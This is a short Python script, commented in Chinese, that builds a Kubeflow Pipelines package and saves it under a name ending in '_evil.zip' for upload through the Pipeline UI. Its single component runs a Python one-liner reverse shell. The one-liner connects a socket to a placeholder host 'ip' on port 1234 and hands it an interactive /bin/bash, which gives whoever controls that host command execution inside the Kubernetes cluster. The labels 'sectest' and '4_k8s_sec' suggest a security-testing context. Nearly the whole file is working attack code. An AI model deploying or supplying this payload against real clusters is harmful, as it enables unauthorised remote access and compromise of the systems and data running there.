#!/usr/bin/env python3
# _*_ coding: utf-8 _*_
import kfp
from kfp import dsl

def create_exp():
  # 假设 python 就是我们要工作的镜像和执行的具体代码的地方
  # 通过 dsl.ContainerOp() 就把上述工作内容作为一个 component 
  return dsl.ContainerOp(
      name='sectest',
      #服务拉取的镜像，保证目标能正常访问并成功拉取image
      image='python',
      command=['sh', '-c'],
      arguments=["python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\""]
  )

# 然后就是设计 pipeline
# 本例很简单，只有一个 component
@dsl.pipeline(
    name='sectest',
    description='4_k8s_sec'
)
def try_create_exp():
      create_exp()

if __name__ == '__main__':
  # 指定生成的包格式zip\tar.gz
  types = "zip"	
  # 通过这个方法，生成一个 zip 文件，用来在 Pipeline UI 上上传的
  kfp.compiler.Compiler().compile(try_create_exp, __file__ + f'_evil.{types}')